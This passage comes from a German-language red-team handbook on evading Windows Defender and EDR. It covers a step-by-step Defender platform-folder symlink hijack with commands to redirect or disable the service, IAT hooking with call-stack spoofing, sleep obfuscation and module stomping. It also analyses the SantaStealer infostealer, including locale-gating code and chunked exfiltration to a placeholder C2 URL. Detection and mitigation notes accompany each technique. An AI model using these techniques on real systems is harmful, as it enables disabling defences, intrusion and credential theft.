- Du kannst den Inhalt, den ClipUp schreibt, nicht über die Platzierung hinaus kontrollieren; die Primitive eignet sich eher für Korruption als für präzise Content-Injektion.
- Erfordert lokalen Admin/SYSTEM, um einen Service zu installieren/starten, sowie ein Reboot-Fenster.
- Timing ist kritisch: das Ziel darf nicht geöffnet sein; Ausführung zur Boot-Zeit vermeidet Dateisperren.

Erkennungen
- Process creation von `ClipUp.exe` mit ungewöhnlichen Argumenten, insbesondere wenn der Parent ein nicht-standardmäßiger Launcher ist, rund um den Bootvorgang.
- Neue Services, die so konfiguriert sind, dass sie verdächtige Binaries automatisch starten, und die konsistent vor Defender/AV starten. Untersuche Service-Erstellung/-Änderung vor Defender-Startup-Fehlern.
- File-integrity-Monitoring auf Defender-Binaries/Platform-Verzeichnissen; unerwartete Datei-Erstellungen/-Änderungen durch Prozesse mit protected-process-Flags.
- ETW/EDR-Telemetrie: achte auf Prozesse, die mit `CREATE_PROTECTED_PROCESS` erstellt wurden, und auf anomale PPL-Level-Nutzung durch Nicht-AV-Binaries.

Mitigations
- WDAC/Code Integrity: beschränke, welche signierten Binaries als PPL laufen dürfen und unter welchen Parents; blockiere ClipUp-Aufrufe außerhalb legitimer Kontexte.
- Service-Hygiene: beschränke das Erstellen/Ändern von Auto-Start-Services und überwache Manipulationen der Startreihenfolge.
- Stelle sicher, dass Defender tamper protection und early-launch protections aktiviert sind; untersuche Startup-Fehler, die auf Binary-Korruption hinweisen.
- Erwäge, die Generierung von 8.3-Kurznamen auf Volumes mit Security-Tooling zu deaktivieren, wenn das mit deiner Umgebung kompatibel ist (gründlich testen).

Referenzen für PPL und Tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender wählt die Plattform, von der aus es läuft, indem es Unterordner unter
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

enumeriert.

Es wählt den Unterordner mit dem höchsten lexikografischen Versionsstring (z. B. `4.18.25070.5-0`) und startet dann die Defender-Serviceprozesse von dort (und aktualisiert dabei die Service-/Registry-Pfade). Diese Auswahl vertraut auf Verzeichniseinträge, einschließlich Directory Reparse Points (symlinks). Ein Administrator kann dies ausnutzen, um Defender auf einen vom Angreifer beschreibbaren Pfad umzuleiten und DLL sideloading oder eine Service-Störung zu erreichen.

Voraussetzungen
- Lokaler Administrator (benötigt, um Verzeichnisse/symlinks unter dem Platform-Ordner zu erstellen)
- Fähigkeit, neu zu booten oder die erneute Plattformauswahl von Defender auszulösen (Service-Neustart beim Boot)
- Es werden nur eingebaute Tools benötigt (mklink)

Warum es funktioniert
- Defender blockiert Schreibzugriffe in seinen eigenen Ordnern, aber die Plattformauswahl vertraut auf Verzeichniseinträge und wählt die lexikografisch höchste Version, ohne zu validieren, dass das Ziel auf einen geschützten/vertrauten Pfad aufgelöst wird.

Schritt für Schritt (Beispiel)
1) Bereite eine beschreibbare Kopie des aktuellen Platform-Ordners vor, z. B. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Erstelle einen Symlink eines Verzeichnisses mit höherer Version innerhalb von Platform, der auf deinen Ordner zeigt:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Trigger-Auswahl (Neustart empfohlen):
```cmd
shutdown /r /t 0
```
4) Überprüfe, ob MsMpEng.exe (WinDefend) vom umgeleiteten Pfad ausgeführt wird:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Du solltest den neuen Prozesspfad unter `C:\TMP\AV\` beobachten und die Dienstkonfiguration/Registry, die diesen Speicherort widerspiegelt.

Post-Exploitation-Optionen
- DLL sideloading/code execution: DLLs droppen/ersetzen, die Defender aus seinem Anwendungsverzeichnis lädt, um Code in Defenders Prozessen auszuführen. Siehe den Abschnitt oben: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Den Version-Symlink entfernen, damit beim nächsten Start der konfigurierte Pfad nicht aufgelöst wird und Defender nicht startet:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Beachten Sie, dass diese Technik allein keine privilege escalation bietet; sie erfordert admin rights.

## API/IAT Hooking + Call-Stack Spoofing mit PIC (Crystal Kit-style)

Red teams können runtime evasion aus dem C2 implant heraus in das Zielmodul selbst verlagern, indem sie dessen Import Address Table (IAT) hooken und ausgewählte APIs über attacker-controlled, position‑independent code (PIC) umleiten. Das verallgemeinert evasion über die kleine API-Oberfläche, die viele Kits bereitstellen (z. B. CreateProcessA), hinaus und erweitert denselben Schutz auf BOFs und post‑exploitation DLLs.

High-level approach
- Stage eine PIC-Blob zusammen mit dem Zielmodul mithilfe eines reflective loader (vorangestellt oder als companion). Das PIC muss self-contained und position-independent sein.
- Während die Host-DLL lädt, gehe durch ihre IMAGE_IMPORT_DESCRIPTOR und patch die IAT-Einträge für gezielte imports (z. B. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc), sodass sie auf dünne PIC-Wrappers zeigen.
- Jeder PIC-Wrapper führt evasions aus, bevor er die echte API-Adresse per tail-call aufruft. Typische evasions umfassen:
- Memory mask/unmask um den Aufruf herum (z. B. beacon regions verschlüsseln, RWX→RX, page names/permissions ändern), danach post-call wiederherstellen.
- Call-stack spoofing: einen benign stack konstruieren und in die Ziel-API übergehen, sodass die call-stack analysis erwartete Frames auflöst.
- Für Kompatibilität ein Interface exportieren, damit ein Aggressor script (oder das Äquivalent) registrieren kann, welche APIs für Beacon, BOFs und post-ex DLLs gehookt werden sollen.

Why IAT hooking here
- Funktioniert für jeden Code, der den gehookten import verwendet, ohne den Tool-Code zu ändern oder sich darauf zu verlassen, dass Beacon bestimmte APIs proxyt.
- Deckt post-ex DLLs ab: Das Hooken von LoadLibrary* erlaubt es, Modul-Ladevorgänge zu intercepten (z. B. System.Management.Automation.dll, clr.dll) und dieselbe masking/stack evasion auf ihre API-Aufrufe anzuwenden.
- Stellt die zuverlässige Nutzung von process-spawning post-ex commands gegen call-stack-based detections wieder her, indem CreateProcessA/W umwickelt wird.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notizen
- Wende den Patch nach den Relocations/ASLR und vor der ersten Nutzung des imports an. Reflective loaders wie TitanLdr/AceLdr demonstrieren Hooking während `DllMain` des geladenen Moduls.
- Halte Wrapper klein und PIC-safe; löse die echte API über den ursprünglichen IAT-Wert auf, den du vor dem Patchen erfasst hast, oder über `LdrGetProcedureAddress`.
- Nutze RW → RX Übergänge für PIC und vermeide es, writable+executable Pages zu hinterlassen.

Call‑stack spoofing stub
- Draugr‑style PIC stubs bauen eine Fake Call Chain auf (Return-Adressen in harmlose modules) und pivotieren dann in die echte API.
- Das umgeht Detektionen, die von Beacon/BOFs canonical stacks zu sensitiven APIs erwarten.
- Kombiniere das mit stack cutting-/stack stitching-Techniken, um vor dem API-Prologue in erwarteten Frames zu landen.

Operational integration
- Stelle den reflective loader vor post-ex DLLs, damit das PIC und die Hooks automatisch initialisiert werden, wenn die DLL geladen wird.
- Nutze ein Aggressor script, um Target APIs zu registrieren, sodass Beacon und BOFs transparent vom selben evasion path profitieren, ohne Codeänderungen.

Detection/DFIR considerations
- IAT integrity: Einträge, die auf non-image (heap/anon) Adressen aufgelöst werden; periodische Verifikation von import pointers.
- Stack anomalies: Return-Adressen, die nicht zu geladenen images gehören; abrupte Übergänge zu non-image PIC; inkonsistente `RtlUserThreadStart`-Abstammung.
- Loader telemetry: Schreibzugriffe im Prozess auf die IAT, frühe `DllMain`-Aktivität, die import thunks modifiziert, unerwartete RX regions, die beim Laden erzeugt werden.
- Image-load evasion: Wenn `LoadLibrary*` gehookt wird, verdächtige Loads von automation/clr assemblies überwachen, die mit memory masking events korrelieren.

Related building blocks and examples
- Reflective loaders, die während des Ladens IAT patching durchführen (z. B. TitanLdr, AceLdr)
- Memory masking hooks (z. B. simplehook) und stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stubs (z. B. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

Wenn du einen reflective loader kontrollierst, kannst du imports **während** `ProcessImports()` hooken, indem du den `GetProcAddress`-Pointer des loaders durch einen custom resolver ersetzt, der Hooks zuerst prüft:

- Erstelle ein **resident PICO** (persistent PIC object), das nach dem Freigeben des transienten loader PIC weiterlebt.
- Exportiere eine `setup_hooks()`-Funktion, die den import resolver des loaders überschreibt (z. B. `funcs.GetProcAddress = _GetProcAddress`).
- In `_GetProcAddress` ordnest du ordinal imports aus und verwendest eine hash-basierte hook lookup wie `__resolve_hook(ror13hash(name))`. Wenn ein Hook existiert, gib ihn zurück; andernfalls delegiere an das echte `GetProcAddress`.
- Registriere hook targets zur Linkzeit mit Crystal Palace `addhook "MODULE$Func" "hook"`-Einträgen. Der Hook bleibt gültig, weil er im resident PICO liegt.

Das ergibt **import-time IAT redirection** ohne nach dem Laden die Code-Sektion der geladenen DLL zu patchen.

### Hookable imports erzwingen, wenn das Target PEB-walking nutzt

Import-time hooks greifen nur, wenn die Funktion tatsächlich in der IAT des Targets steht. Wenn ein Modul APIs per PEB-walk + hash auflöst (kein import entry), erzwinge einen echten Import, damit der `ProcessImports()`-Pfad des loaders ihn sieht:

- Ersetze hashed export resolution (z. B. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) durch eine direkte Referenz wie `&WaitForSingleObject`.
- Der Compiler erzeugt einen IAT-Eintrag, der Interception ermöglicht, wenn der reflective loader imports auflöst.

### Ekko-style sleep/idle obfuscation ohne Patchen von `Sleep()`

Statt `Sleep` zu patchen, hooke die **tatsächlichen wait/IPC primitives**, die das Implant verwendet (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Bei langen waits umwickle den Call in eine Ekko-style obfuscation chain, die das In-Memory-Image während der idle-Phase verschlüsselt:

- Nutze `CreateTimerQueueTimer`, um eine Folge von Callbacks zu planen, die `NtContinue` mit konstruierten `CONTEXT`-Frames aufrufen.
- Typische Kette (x64): Image auf `PAGE_READWRITE` setzen → RC4-Verschlüsselung via `advapi32!SystemFunction032` über das vollständige gemappte Image → den blockierenden wait ausführen → RC4 entschlüsseln → **per-section permissions wiederherstellen**, indem PE sections durchlaufen werden → Abschluss signalisieren.
- `RtlCaptureContext` liefert eine Vorlage `CONTEXT`; klone sie in mehrere Frames und setze Register (`Rip/Rcx/Rdx/R8/R9`), um jeden Schritt auszuführen.

Operational detail: Gib bei langen waits „success“ zurück (z. B. `WAIT_OBJECT_0`), damit der Aufrufer fortfährt, während das Image maskiert ist. Dieses Muster verbirgt das Modul während idle windows vor Scannern und vermeidet die klassische Signatur „gepatchtes `Sleep()`“.

Detection ideas (telemetry-based)
- Bursts von `CreateTimerQueueTimer`-Callbacks, die auf `NtContinue` zeigen.
- `advapi32!SystemFunction032` auf großen, zusammenhängenden, image-großen Buffern.
- `VirtualProtect` über große Bereiche, gefolgt von custom per-section permission restoration.


## Precision Module Stomping

Module stomping führt Payloads aus der **`.text`-Sektion einer DLL, die bereits im Zielprozess gemappt ist**, statt offensichtlichen privaten ausführbaren Speicher zu allokieren oder eine frische Opferr-DLL zu laden. Das Überschreibungsziel sollte ein **geladenes, disk-backed image** sein, dessen Codebereich den Payload aufnehmen kann, ohne Codepfade zu beschädigen, die der Prozess noch benötigt.

### Reliable target selection

Naives Stomping gegen gängige modules wie `uxtheme.dll` oder `comctl32.dll` ist fragil: Die DLL ist möglicherweise nicht im Remote-Prozess geladen, und ein zu kleiner Codebereich lässt den Prozess abstürzen. Ein zuverlässigerer Workflow ist:

1. Enumeriere die modules des Zielprozesses und behalte eine **names-only include list** von bereits geladenen DLLs.
2. Baue den Payload zuerst und notiere seine **exakte Byte-Größe**.
3. Scanne Kandidaten-DLLs auf Disk und vergleiche die PE section **`.text` `Misc_VirtualSize`** mit der Payload-Größe. Das ist wichtiger als die Dateigröße, weil es die Größe der ausführbaren Sektion **im Speicherzustand nach dem Mapping** widerspiegelt.
4. Parse die **Export Address Table (EAT)** und wähle eine exportierte function RVA als Startoffset für das stomping.
5. Berechne den **blast radius**: Wenn der Payload die gewählte function boundary überschreitet, überschreibt er angrenzende Exports, die danach im Speicher angeordnet sind.

Typische Recon/Selection-Helpers, die in der Praxis zu sehen sind:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Betriebliche Hinweise
- Bevorzuge **bereits geladene** DLLs im Remote-Prozess, um die Telemetrie von `LoadLibrary`/unerwarteten Image-Ladevorgängen zu vermeiden.
- Bevorzuge Exports, die von der Zielanwendung selten ausgeführt werden; andernfalls können normale Codepfade auf die gestompten Bytes vor oder nach der Thread-Erstellung treffen.
- Große Implants erfordern oft, dass das Shellcode-Embedding von einem String-Literal zu einem **Byte-Array/braced initializer** geändert wird, damit der vollständige Buffer im Injector-Quellcode korrekt dargestellt wird.

Erkennungs-Ideen
- Remote-Writes in **image-backed executable pages** (`MEM_IMAGE`, `PAGE_EXECUTE*`) statt der üblichen privaten RWX/RX-Allocations.
- Export-Entry-Points, deren Bytes im Speicher nicht mehr mit der zugrunde liegenden Datei auf der Festplatte übereinstimmen.
- Remote-Threads oder Context-Pivots, die die Ausführung innerhalb eines legitimen DLL-Exports beginnen, dessen erste Bytes kürzlich verändert wurden.
- Verdächtige `VirtualProtect(Ex)` / `WriteProcessMemory`-Sequenzen gegen DLL-`.text`-Pages, gefolgt von Thread-Erstellung.

## SantaStealer Tradecraft für Fileless Evasion und Credential Theft

SantaStealer (aka BluelineStealer) zeigt, wie moderne Info-Stealer AV bypass, Anti-Analysis und Credential Access in einem einzigen Workflow verbinden.

### Keyboard-Layout-Gating & Sandbox-Delay

- Ein Config-Flag (`anti_cis`) zählt installierte Keyboard-Layouts über `GetKeyboardLayoutList` auf. Wenn ein kyrillisches Layout gefunden wird, legt das Sample einen leeren `CIS`-Marker ab und beendet sich vor dem Start der Stealer, sodass es niemals auf ausgeschlossenen Locales detoniert, während es ein Hunting-Artefakt hinterlässt.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Gestaffelte `check_antivm`-Logik

- Variante A durchläuft die Prozessliste, hasht jeden Namen mit einer benutzerdefinierten Rolling-Checksum und vergleicht ihn mit eingebetteten Blocklisten für Debugger/Sandboxes; sie wiederholt die Checksum über den Computernamen und prüft Arbeitsverzeichnisse wie `C:\analysis`.
- Variante B prüft Systemeigenschaften (Mindestanzahl von Prozessen, kurze Laufzeit), ruft `OpenServiceA("VBoxGuest")` auf, um VirtualBox-Erweiterungen zu erkennen, und führt Timing-Checks um Sleeps herum aus, um Single-Stepping zu erkennen. Jeder Treffer bricht ab, bevor Module gestartet werden.

### Fileless-Helper + doppelte ChaCha20-reflektive Ladung

- Die primäre DLL/EXE bettet einen Chromium-Credential-Helper ein, der entweder auf die Festplatte geschrieben oder manuell im Speicher gemappt wird; im fileless-Modus löst er Imports/Relocations selbst auf, sodass keine Helper-Artefakte geschrieben werden.
- Dieser Helper speichert eine zweite DLL, die zweimal mit ChaCha20 verschlüsselt ist (zwei 32-Byte-Keys + 12-Byte-Nonces). Nach beiden Durchläufen lädt er den Blob reflektiv (ohne `LoadLibrary`) und ruft Exporte `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` auf, abgeleitet von [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- Die ChromElevator-Routinen verwenden direct-syscall reflective process hollowing, um in einen laufenden Chromium-Browser zu injizieren, AppBound Encryption-Keys zu übernehmen und Passwörter/Cookies/Kreditkarten direkt aus SQLite-Datenbanken zu entschlüsseln, trotz ABE-Härtung.


### Modulare In-Memory-Sammlung & chunked HTTP-Exfiltration

- `create_memory_based_log` iteriert über eine globale `memory_generators`-Function-Pointer-Tabelle und startet einen Thread pro aktiviertem Modul (Telegram, Discord, Steam, Screenshots, Dokumente, Browser-Erweiterungen usw.). Jeder Thread schreibt Ergebnisse in Shared Buffers und meldet seine Dateianzahl nach einem ~45s-Join-Fenster.
- Nach Abschluss wird alles mit der statisch gelinkten `miniz`-Bibliothek als `%TEMP%\\Log.zip` gezippt. `ThreadPayload1` schläft dann 15s und streamt das Archiv in 10 MB-Chunks per HTTP POST an `http://<C2>:6767/upload`, wobei ein Browser-`multipart/form-data`-Boundary (`----WebKitFormBoundary***`) vorgetäuscht wird. Jeder Chunk fügt `User-Agent: upload`, `auth: <build_id>`, optional `w: <campaign_tag>` hinzu, und der letzte Chunk ergänzt `complete: true`, damit das C2 weiß, dass die Rekonstruktion abgeschlossen ist.

## References


- [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)


{{#include ../banners/hacktricks-training.md}}
